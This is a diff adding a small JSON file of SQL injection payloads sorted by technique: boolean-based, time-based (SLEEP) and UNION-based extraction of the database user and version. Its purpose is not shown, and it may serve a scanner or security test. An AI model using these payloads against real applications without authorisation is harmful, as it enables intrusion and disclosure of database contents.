@@ -1,0 +1,11 @@
+{
+  "boolean": [
+    "' OR '1'='1' --"
+  ],
+  "time": [
+    "' AND SLEEP(5)--"
+  ],
+  "union": [
+    "' UNION SELECT user(),version()--"
+  ]
+}
